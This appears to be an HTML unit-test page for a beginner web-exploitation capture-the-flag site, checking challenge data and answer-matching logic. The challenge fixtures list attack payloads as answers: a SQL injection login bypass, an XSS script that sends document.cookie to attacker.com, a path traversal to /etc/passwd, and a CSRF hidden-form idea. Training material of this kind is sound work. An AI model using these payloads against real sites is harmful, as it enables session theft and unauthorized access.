<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tests - Web Exploitation</title>
    <link rel="icon" href="../images/logo.png" type="image/png">
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a1a;
            color: #00ff00;
            padding: 20px;
            max-width: 1000px;
            margin: 0 auto;
        }
        .test-suite {
            background: #0d0d0d;
            border: 2px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        .test-case {
            padding: 15px;
            margin: 10px 0;
            border-left: 4px solid #00ff00;
            background: #1a1a1a;
        }
        .passed { color: #90EE90; }
        .failed { color: #FF6B6B; }
        h1, h2 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
        .summary { margin-top: 40px; padding: 20px; background: #0d1f3c; border: 2px solid #00ff00; border-radius: 8px; }
    </style>
</head>
<body>
    <h1>üï∑Ô∏è Web Exploitation - Test Suite</h1>
    
    <div class="test-suite">
        <h2>Challenge Data Tests</h2>
        <div id="dataTests"></div>
    </div>

    <div class="test-suite">
        <h2>Function Tests</h2>
        <div id="functionTests"></div>
    </div>

    <div class="summary">
        <h2>Test Summary</h2>
        <div id="summary"></div>
    </div>

    <script>
        let passCount = 0, failCount = 0;

        function assert(condition, message) {
            const div = document.createElement('div');
            div.className = 'test-case ' + (condition ? 'passed' : 'failed');
            div.innerHTML = (condition ? '‚úÖ PASS' : '‚ùå FAIL') + ': ' + message;
            return { passed: condition, div };
        }

        function runDataTests() {
            const container = document.getElementById('dataTests');
            const challenges = [
                { id: 1, title: 'SQL Query Bypass', description: 'What SQL injection payload bypasses this login?', encrypted: 'SELECT * FROM users WHERE username=\'{input}\' AND password=\'{password}\'', answer: 'or \'1\'=\'1', hint: 'Use a comment -- to bypass password check', difficulty: 'Easy', points: 25 },
                { id: 2, title: 'XSS Payload', description: 'What XSS payload steals cookies?', encrypted: '<img src=x onerror="alert(\'XSS\')">', answer: '<script>document.location=\'http://attacker.com/?c=\'+document.cookie</script>', hint: 'Use script tags to steal session cookies from victims', difficulty: 'Medium', points: 40 },
                { id: 3, title: 'Path Traversal', description: 'What path accesses /etc/passwd?', encrypted: '/download.php?file=document.pdf', answer: '../../../etc/passwd', hint: 'Use ../ sequences to go up directories in the path', difficulty: 'Easy', points: 25 },
                { id: 4, title: 'CSRF Token', description: 'How do you exploit CSRF vulnerabilities?', encrypted: '<form action="http://bank.com/transfer" method="POST">', answer: 'create a hidden form on attacker site', hint: 'Victim automatically clicks link and request executes in their session', difficulty: 'Medium', points: 40 }
            ];

            const tests = [
                assert(challenges.length === 4, 'Should have 4 challenges'),
                assert(challenges[0].id === 1, 'First challenge ID should be 1'),
                assert(challenges[0].points === 25, 'SQL challenge should award 25 points'),
                assert(challenges[1].difficulty === 'Medium', 'XSS challenge difficulty should be Medium'),
                assert(challenges.every(c => c.answer && c.hint), 'All challenges should have answer and hint'),
                assert(challenges.filter(c => c.difficulty === 'Easy').length === 2, 'Should have 2 easy challenges'),
            ];

            tests.forEach(test => {
                container.appendChild(test.div);
                if (test.passed) passCount++; else failCount++;
            });
        }

        function runFunctionTests() {
            const container = document.getElementById('functionTests');

            // Test localStorage/sessionStorage functions
            const tests = [];

            // Clear storage for testing
            localStorage.clear();
            sessionStorage.clear();

            tests.push(assert(sessionStorage.getItem('ctfUser') === null, 'Session storage should be empty initially'));

            // Simulate getUser() behavior
            sessionStorage.setItem('testUser', 'testPlayer');
            tests.push(assert(sessionStorage.getItem('testUser') === 'testPlayer', 'Can set and retrieve from sessionStorage'));

            // Test localStorage for user tracking
            const testUsers = { player1: { solved: [1, 2], points: 65 } };
            localStorage.setItem('ctfUsers', JSON.stringify(testUsers));
            const stored = JSON.parse(localStorage.getItem('ctfUsers'));
            tests.push(assert(stored.player1.points === 65, 'Should correctly store user points'));
            tests.push(assert(stored.player1.solved.includes(1), 'Should track solved challenges'));

            // Test answer validation logic
            const challenge = { id: 1, answer: 'or \'1\'=\'1', points: 25 };
            const userAnswer1 = 'or \'1\'=\'1';
            const match1 = userAnswer1.toLowerCase().trim() === challenge.answer.toLowerCase();
            tests.push(assert(match1, 'Exact answer match should return true'));

            const userAnswer2 = 'or';
            const match2 = userAnswer2.toLowerCase().includes(challenge.answer.toLowerCase().split(' ')[0]);
            tests.push(assert(match2, 'First word match should work for partial answers'));

            const userAnswer3 = 'incorrect answer';
            const match3 = userAnswer3.toLowerCase().trim() === challenge.answer.toLowerCase();
            tests.push(assert(!match3, 'Incorrect answer should return false'));

            tests.push(assert(typeof Array.isArray === 'function', 'Should have array type checking available'));
            tests.push(assert(['Easy', 'Medium', 'Hard'].includes('Medium'), 'Difficulty levels should be valid'));

            tests.forEach(test => {
                container.appendChild(test.div);
                if (test.passed) passCount++; else failCount++;
            });

            localStorage.clear();
            sessionStorage.clear();
        }

        function displaySummary() {
            const total = passCount + failCount;
            const percentage = total > 0 ? Math.round((passCount / total) * 100) : 0;
            document.getElementById('summary').innerHTML = `
                <p>Total Tests: ${total}</p>
                <p class="passed">Passed: ${passCount}</p>
                <p class="failed">Failed: ${failCount}</p>
                <p>Success Rate: ${percentage}%</p>
            `;
        }

        runDataTests();
        runFunctionTests();
        displaySummary();
    </script>
<script src="../js/profile-widget.js"></script>
</body>
</html>